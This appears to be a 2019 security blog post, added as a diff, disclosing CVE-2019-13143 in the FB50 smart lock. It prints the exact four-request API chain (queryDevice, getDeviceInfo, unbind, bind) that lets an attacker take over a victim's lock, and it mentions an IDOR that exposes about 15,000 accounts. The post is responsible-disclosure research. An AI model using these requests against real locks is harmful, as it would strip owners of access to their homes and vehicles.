@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang=en>
+<link rel="stylesheet" href="/static/style.css" type="text/css">
+<link rel="stylesheet" href="/static/syntax.css" type="text/css">
+<link rel="shortcut icon" type="images/x-icon" href="/static/favicon.ico">
+<meta name="description" content="… and lessons learnt in IoT security">
+<meta name="viewport" content="initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta content="#021012" name="theme-color">
+<meta name="HandheldFriendly" content="true">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@icyphox">
+<meta name="twitter:title" content="Picking the FB50 smart lock">
+<meta name="twitter:description" content="… and lessons learnt in IoT security">
+<meta name="twitter:image" content="/static/icyphox.png">
+<meta property="og:title" content="Picking the FB50 smart lock">
+<meta property="og:type" content="website">
+<meta property="og:description" content="… and lessons learnt in IoT security">
+<meta property="og:url" content="https://icyphox.sh">
+<meta property="og:image" content="/static/icyphox.png">
+<html>
+  <title>
+    Picking the FB50 smart lock
+  </title>
+<script src="//instant.page/1.1.0" type="module" integrity="sha384-EwBObn5QAxP8f09iemwAJljc+sU+eUXeL9vSBw1eNmVarwhKk2F9vBEpaN9rsrtp"></script>
+<div class="container-text">
+  <header class="header">
+    
+        <a href="/">home</a>
+        <a href="/blog">blog</a>
+        <a href="/reading">reading</a>
+        <a href="https://twitter.com/icyphox">twitter</a>
+        <a href="/about">about</a>
+
+  </header>
+<body> 
+   <div class="content">
+    <div align="left">
+      <p> 2019-08-05 </p>
+      <h1 id="picking-the-fb50-smart-lock">Picking the FB50 smart lock</h1>
+
+<h2 id="and-lessons-learnt-in-iot-security">… and lessons learnt in IoT security</h2>
+
+<h3 id="the-lock">The lock</h3>
+
+<p>The lock in question is the FB50 smart lock, manufactured by Shenzhen
+Dragon Brother Technology Co. Ltd. This lock is sold under multiple brands
+across many ecommerce sites, and has over, an estimated, 15k+ users.</p>
+
+<p>The lock pairs to a phone via bluetooth, and requires the OKLOK app from
+the Play/App Store to function. The app requires the user to create an
+account before further functionality is available. 
+The app facilitates the fingerprint unlock configuration on the
+lock, and unlocking from a range via bluetooth.</p>
+
+<p>We had two primary attack surfaces we decided to tackle — Bluetooth (BLE)
+and the Android app.</p>
+
+<h3 id="via-bluetooth-low-energy-ble">Via Bluetooth Low Energy (BLE)</h3>
+
+<p>Android phones have the ability to capture Bluetooth (HCI) traffic
+which can be enabled under Developer Options under Settings. We made 
+around 4 &#8220;unlocks&#8221; from the Android phone, as seen in the screenshot.</p>
+
+<p><img src="/static/img/bt_wireshark.png" alt="wireshark packets" /></p>
+
+<p>This is the value sent in the <code>Write</code> request:</p>
+
+<p><img src="/static/img/bt_ws_value.png" alt="wireshark write req" /></p>
+
+<p>We attempted replaying these requests using <code>gattool</code> and <code>gattacker</code>,
+but that didn&#8217;t pan out, since the value being written was encrypted.<sup class="footnote-ref&#8221; id="fnref-1"><a href="#fn-1">1</a></sup></p>
+
+<h3 id="via-the-android-app">Via the Android app</h3>
+
+<p>Reversing the app using <code>jd-gui</code>, <code>apktool</code> and <code>dex2jar</code> didn&#8217;t get us too
+far since most of it was obfuscated. Why bother when there exists an 
+easier approach &#8211; BurpSuite.</p>
+
+<p>We captured and played around with a bunch of requests and responses,
+and finally arrived at a working exploit chain.</p>
+
+<h3 id="the-exploit">The exploit</h3>
+
+<p>The entire exploit is a 4 step process consisting of authenticated 
+HTTP requests:</p>
+
+<ol>
+<li>Using the lock&#8217;s MAC (obtained via a simple bluetooth scan in the 
+vicinity), get the barcode and lock ID</li>
+<li>Using the barcode, fetch the user ID</li>
+<li>Using the lock ID and user ID, unbind the user from the lock</li>
+<li>Provide a new name, attacker&#8217;s user ID and the MAC to bind the attacker
+to the lock</li>
+</ol>
+
+<p>This is what it looks like, in essence (personal info redacted).</p>
+
+<h4 id="request-1">Request 1</h4>
+
+<pre><code>POST /oklock/lock/queryDevice
+{"mac":"XX:XX:XX:XX:XX:XX"}
+</code></pre>
+
+<p>Response:</p>
+
+<pre><code>{
+   "result":{
+      "alarm":0,
+      "barcode":"&lt;BARCODE&gt;",
+      "chipType":"1",
+      "createAt":"2019-05-14 09:32:23.0",
+      "deviceId":"",
+      "electricity":"95",
+      "firmwareVersion":"2.3",
+      "gsmVersion":"",
+      "id":&lt;LOCK ID&gt;,
+      "isLock":0,
+      "lockKey":"69,59,58,0,26,6,67,90,73,46,20,84,31,82,42,95",
+      "lockPwd":"000000",
+      "mac":"XX:XX:XX:XX:XX:XX",
+      "name":"lock",
+      "radioName":"BlueFPL",
+      "type":0
+   },
+   "status":"2000"
+}
+</code></pre>
+
+<h4 id="request-2">Request 2</h4>
+
+<pre><code>POST /oklock/lock/getDeviceInfo
+
+{"barcode":"https://app.oklok.com.cn/app.html?id=&lt;BARCODE&gt;"}
+</code></pre>
+
+<p>Response:</p>
+
+<pre><code>   "result":{
+      "account":"email@some.website",
+      "alarm":0,
+      "barcode":"&lt;BARCODE&gt;",
+      "chipType":"1",
+      "createAt":"2019-05-14 09:32:23.0",
+      "deviceId":"",
+      "electricity":"95",
+      "firmwareVersion":"2.3",
+      "gsmVersion":"",
+      "id":&lt;LOCK ID&gt;,
+      "isLock":0,
+      "lockKey":"69,59,58,0,26,6,67,90,73,46,20,84,31,82,42,95",
+      "lockPwd":"000000",
+      "mac":"XX:XX:XX:XX:XX:XX",
+      "name":"lock",
+      "radioName":"BlueFPL",
+      "type":0,
+      "userId":&lt;USER ID&gt;
+   }
+</code></pre>
+
+<h4 id="request-3">Request 3</h4>
+
+<pre><code>POST /oklock/lock/unbind
+
+{"lockId":"&lt;LOCK ID&gt;","userId":&lt;USER ID&gt;}
+</code></pre>
+
+<h4 id="request-4">Request 4</h4>
+
+<pre><code>POST /oklock/lock/bind
+
+{"name":"newname","userId":&lt;USER ID&gt;,"mac":"XX:XX:XX:XX:XX:XX"}
+</code></pre>
+
+<h3 id="thats-it-the-scary-stuff">That&#8217;s it! (&amp; the scary stuff)</h3>
+
+<p>You should have the lock transferred to your account. The severity of this
+issue lies in the fact that the original owner completely loses access to
+their lock. They can&#8217;t even &#8220;rebind&#8221; to get it back, since the current owner 
+(the attacker) needs to authorize that. </p>
+
+<p>To add to that, roughly 15,000 user accounts&#8217; info are exposed via IDOR.
+Ilja, a cool dude I met on Telegram, noticed locks named &#8220;carlock&#8221;, 
+&#8220;garage&#8221;, &#8220;MainDoor&#8221;, etc.<sup class="footnote-ref&#8221; id="fnref-2"><a href="#fn-2">2</a></sup> This is terrifying.</p>
+
+<p><em>shudders</em></p>
+
+<h3 id="proof-of-concept">Proof of Concept</h3>
+
+<p><a href="https://twitter.com/icyphox/status/1158396372778807296">PoC Video</a></p>
+
+<p><a href="https://github.com/icyphox/pwnfb50">Exploit code</a></p>
+
+<h3 id="disclosure-timeline">Disclosure timeline</h3>
+
+<ul>
+<li><strong>26th June, 2019</strong>: Issue discovered at SecureLayer7, Pune</li>
+<li><strong>27th June, 2019</strong>: Vendor notified about the issue</li>
+<li><strong>2nd July, 2019</strong>: CVE-2019-13143 reserved</li>
+<li>No response from vendor</li>
+<li><strong>2nd August 2019</strong>: Public disclosure</li>
+</ul>
+
+<h3 id="lessons-learnt">Lessons learnt</h3>
+
+<p><strong>DO NOT</strong>. Ever. Buy. A smart lock. You&#8217;re better off with the &#8220;dumb&#8221; ones
+with keys. With the IoT plague spreading, it brings in a large attack surface
+to things that were otherwise &#8220;unhackable&#8221; (try hacking a &#8220;dumb&#8221; toaster).</p>
+
+<p>Our existing threat models and scenarios have to be updated to factor 
+in these new exploitation possibilities. This also broadens the playing 
+field for cyber warfare and mass surveillance campaigns. </p>
+
+<h3 id="researcher-info">Researcher info</h3>
+
+<p>This research was done at <a href="https://securelayer7.net">SecureLayer7</a>, Pune, IN by:</p>
+
+<ul>
+<li>Anirudh Oppiliappan (me)</li>
+<li>S. Raghav Pillai (<a href="https://twitter.com/_vologue">@_vologue</a>)</li>
+<li>Shubham Chougule (<a href="https://twitter.com/shubhamtc">@shubhamtc</a>)</li>
+</ul>
+
+<div class="footnotes">
+<hr />
+<ol>
+<li id="fn-1">
+<p><a href="https://www.pentestpartners.com/security-blog/pwning-the-nokelock-api/">This</a> article discusses a similar smart lock, but they broke the encryption.&#160;<a href="#fnref-1" class="footnoteBackLink" title="Jump back to footnote 1 in the text.">&#8617;</a></p>
+</li>
+
+<li id="fn-2">
+<p>Thanks to Ilja Shaposhnikov (@drakylar) for bruteforcing the IDs and sharing the data dump.&#160;<a href="#fnref-2" class="footnoteBackLink" title="Jump back to footnote 2 in the text.">&#8617;</a></p>
+</li>
+</ol>
+</div>
+ 
+    </div>
+    <hr />
+    <p class="muted">Questions or comments? Open an issue at <a href="https://github.com/icyphox/site">this repo</a>, or send a plain-text email to <a href="mailto:icyph0x@pm.me">icyph0x@pm.me</a>.</p>
+    <footer>
+      <img src="https://licensebuttons.net/p/zero/1.0/80x15.png">
+    </footer>
+  </body>
+  </div>
+ </html>
